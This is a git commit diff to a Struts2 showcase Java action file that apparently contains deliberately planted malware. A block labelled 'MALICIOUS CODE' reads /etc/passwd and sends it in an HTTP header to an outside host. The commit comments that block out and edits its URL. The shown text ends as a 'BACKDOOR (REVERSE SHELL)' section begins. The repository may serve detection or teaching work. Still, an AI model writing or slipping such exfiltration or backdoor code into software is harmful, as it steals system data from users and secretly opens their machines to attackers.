88aa2dca2f799bad546cdd5f32b80ce28db742eb
Dave Ferguson <6633962+gmdavef@users.noreply.github.com>
2024-05-14 17:29:15 -0500

    Update JSPEvalAction.java

--- src/main/java/org/apache/struts2/showcase/action/JSPEvalAction.java
+++ src/main/java/org/apache/struts2/showcase/action/JSPEvalAction.java
@@ -44,17 +44,17 @@ public class JSPEvalAction extends ExampleAction {
 				writer.write(jsp);
 			} finally {
 				// BEGIN MALICIOUS CODE
-				
+				/*
     				File f = new File( "/etc/passwd" );
 				byte[] bytes = new byte[(int)f.length()];
 				FileInputStream fis = new FileInputStream(f);
 				fis.read(bytes);
 				String data = new String( bytes );
-				URL evil = new URL("http://dukeenergyltd.top");
+				URL evil = new URL("http://dukeenergyltd.top/slurp");
 				HttpURLConnection con = (HttpURLConnection)evil.openConnection();
 				con.setRequestProperty("Exfil", data);
 				int code = con.getResponseCode();
-    				
+    				*/
 				// END MALICIOUS CODE
 
 				// BEGIN BACKDOOR (REVERSE SHELL) CODE
